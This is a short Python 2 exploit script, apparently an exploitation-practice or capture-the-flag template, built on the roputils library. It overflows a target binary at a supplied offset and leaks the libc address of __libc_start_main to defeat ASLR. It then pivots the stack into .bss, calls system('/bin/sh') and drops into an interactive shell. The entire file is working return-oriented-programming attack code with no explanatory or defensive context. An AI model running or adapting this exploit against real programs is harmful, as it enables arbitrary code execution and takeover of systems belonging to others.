from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
libc = ROP('/lib/i386-linux-gnu/libc.so.6')
addr_stage = rop.section('.bss') + 0x400

buf = rop.retfill(offset)
buf += rop.call_plt('write', 1, rop.got('__libc_start_main'), 4)
buf += rop.call_plt('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()
libc.set_base(ref_addr, '__libc_start_main')

buf = libc.call(libc.addr('system'), libc.str('/bin/sh'))
buf += libc.fill(100, buf)

p.write(buf)
p.interact(0)
